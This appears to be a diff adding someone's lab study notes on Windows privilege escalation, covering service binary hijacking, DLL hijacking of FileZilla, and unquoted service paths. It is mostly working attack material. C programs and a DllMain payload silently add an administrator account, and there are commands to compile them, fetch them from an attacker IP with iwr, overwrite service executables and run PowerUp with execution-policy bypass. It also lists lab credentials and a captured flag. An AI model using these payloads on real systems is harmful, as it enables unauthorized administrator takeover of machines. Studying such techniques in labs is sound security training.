@@ -1,0 +1,192 @@
+Windows Privilege Escalation
+
+Leveraging Windows Services
+
+Service Binary Hijacking
+
+attacker 192.168.49.54
+
+CLIENTWK220 
+dave/lab
+
+services.msc
+Get-Service
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+icacls "C:\xampp\mysql\bin\mysqld.exe" (looking for F)
+Get-ACL
+
+adduser.c:
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+
+whoami /priv (look for SeShutDownPrivilege)
+shutdown /r /t 0
+
+Get-LocalGroupMember administrators
+
+another approach:
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+
+powershell -ep bypass
+.\PowerUp.ps1
+Get-ModifiableServiceFile
+
+---------
+DLL Hijacking
+
+attacker 192.168.49.54
+target 192.168.54.220
+
+search order:
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
+CLIENTWK220
+steve/securityIsNotAnOption++++++
+
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+Process Monitor (Procmon)
+
+backupadmin/admin123admin123!
+
+TextShaping.dll default loading fail in filezilla 3.63.1 lead to DLL hijacking vulnerability (CVE-2023-53959)
+
+TextShaping.cpp:
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+
+sudo apt install mingw-w64
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+C:\FileZilla\FileZilla FTP Client\TextShaping.dll
+
+python3 -m http.server 80
+
+nc 192.168.54.220 4444
+iwr -uri http://192.168.49.54/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+
+(waiting awhile, dave3 is created, assume someone start FileZilla service)
+
+net user
+net localgroup administrators
+
+dave3/password123!
+runas /user:dave3 cmd
+runas /user:clientwk220\dave3 "command"
+
+when use runas command, cannot enter password, the password prompt just skip away !
+
+xfreerdp3 /u:dave3 /p:password123! /v:192.168.54.220
+c:\users\daveadmin\desktop\flag.txt
+OS{8a1af7638c45274e6adef38f3f610766}
+
+-----------
+Unquoted Service Paths
+
+CLIENTWK220
+steve/securityIsNotAnOption++++++
+
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+(directly find unquoted paths, and not located in C:\windows)
+
+Start-Service GammaService
+Stop-Service GammaService
+
+C:\Program.exe
+C:\Program Files\Enterprise.exe
+C:\Program Files\Enterprise Apps\Current.exe
+C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+
+icacls "C:\"
+icacls "C:\Program Files"
+icacls "C:\Program Files\Enterprise Apps" (W)
+
+iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+
+Start-Service GammaService
+net user
+net localgroup administrators
+
+or:
+/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
+.\PowerUp.ps1
+Get-UnquotedService (use Powerup.ps1 to check unquoted vulnerability)
+Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe" (use AbuseFunction)
+
+attacker 192.168.49.53
+target 192.168.53.220
+exploit GammaService, find the flag on the desktop of daveadmin
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+nc 192.168.53.220 4444
+iwr -uri http://192.168.49.53/adduser.exe -OutFile Current.exe
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+
+Start-Service GammaService
+net user
+net localgroup administrators
+
+Start-Service : Cannot find any service with service name 'GammaService' !
+
+Get-Service -Name "GammaService"
+
+xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.53.220
+Windows could not start the GammaService service on Local Computer
+Error 1053: The service did not respond to the start or control request in a timely fashion !
+
+
